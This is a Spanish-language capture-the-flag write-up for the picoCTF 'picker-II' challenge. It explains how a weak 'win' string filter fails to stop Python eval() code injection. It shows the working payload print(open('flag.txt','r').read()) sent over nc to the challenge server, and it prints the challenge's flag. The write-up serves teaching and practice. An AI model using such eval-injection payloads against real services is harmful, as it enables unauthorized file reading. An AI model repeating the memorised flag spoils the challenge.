# Descripción
Este reto consiste en analizar el programa `picker-II.py`, el cual implementa un menú interactivo que ejecuta funciones mediante `eval()`. Existe un filtro simple que bloquea cualquier entrada que contenga la palabra `"win"`, intentando impedir que el usuario llame directamente a la función oculta que imprime la *flag*.  
Sin embargo, debido a un mal uso de `eval()`, el programa sigue siendo vulnerable y permite leer archivos arbitrarios, incluyendo `flag.txt`.

## Solución
El funcionamiento del programa es:

- El usuario ingresa un comando en el prompt `==>`.
- Antes de ejecutar, pasa por la función:

```python
def filter(user_input):
  if 'win' in user_input:
    return False
  return True
```

- Si la entrada **NO contiene** `"win"`, entonces ejecuta:

```python
eval(user_input + '()')
```

- Si la entrada **sí contiene** `"win"`, devuelve:

```
Illegal input
```

### Vulnerabilidad Principal
Aunque el filtro busca `"win"`, **eval todavía puede ejecutar expresiones completas de Python**, incluyendo:

```python
print(open('flag.txt', 'r').read())
```

El filtro no detecta `"win"` en esa expresión, por lo que deja que pase.  
`eval()` es extremadamente peligroso porque no solo ejecuta funciones, sino **cualquier expresión**, incluyendo llamadas a `open()`.

### Explotación realizada
1. Se conecta al servidor remoto:

```
nc saturn.picoctf.net 50482
```

2. En el prompt `==>`, se ejecuta:

```
print(open('flag.txt', 'r').read())
```

3. El servidor responde:

```
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
'NoneType' object is not callable
```

El error final aparece porque `eval()` intenta interpretar el retorno de `print()`, pero **la flag ya se imprimió correctamente**, que es todo lo que importa.

## Notas adicionales
- El filtro es débil porque solo revisa la cadena `"win"` en la entrada.
- `eval()` no debe usarse para ejecutar entrada del usuario, ya que permite ejecutar cualquier instrucción de Python.
- No fue necesario romper el filtro ni manipular la estructura del programa, solo ejecutar una expresión válida que lea archivos.
- El error final no afecta la extracción de la flag.

## Referencias
- Video: https://youtu.be/6h2S6bWu5bQ
- Archivo: `picker-II.py`
